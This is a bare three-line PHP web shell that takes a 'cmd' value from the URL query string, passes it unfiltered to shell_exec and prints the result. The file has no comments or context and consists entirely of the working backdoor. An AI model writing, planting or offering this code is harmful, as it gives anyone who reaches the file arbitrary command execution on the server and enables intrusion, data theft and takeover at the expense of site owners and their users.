<?php
$command=$_GET['cmd'];
echo shell_exec($command);
